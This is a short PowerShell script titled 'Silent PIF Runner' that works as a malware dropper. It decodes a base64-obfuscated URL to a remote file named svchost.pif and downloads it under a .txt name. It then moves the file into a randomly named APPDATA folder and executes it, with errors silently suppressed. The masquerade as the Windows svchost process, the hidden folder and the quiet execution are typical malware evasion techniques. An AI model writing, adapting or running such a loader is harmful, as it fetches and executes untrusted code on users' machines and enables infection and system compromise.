# Silent PIF Runner
$pifUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2h5cG5vdGl4eDAveGVub2xvcmQvcmF3L3JlZnMvaGVhZHMvbWFpbi9zdmNob3N0LnBpZg=="))
$downloadPath = "$env:USERPROFILE\Downloads\svchost.txt"
$randomFolder = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
$finalPath = "$env:APPDATA\$randomFolder"

try {
    Invoke-WebRequest -Uri $pifUrl -OutFile $downloadPath -UseBasicParsing
    New-Item -ItemType Directory -Path $finalPath -Force | Out-Null
    Move-Item -Path $downloadPath -Destination "$finalPath\svchost.pif" -Force
    & "$finalPath\svchost.pif"
} catch {}
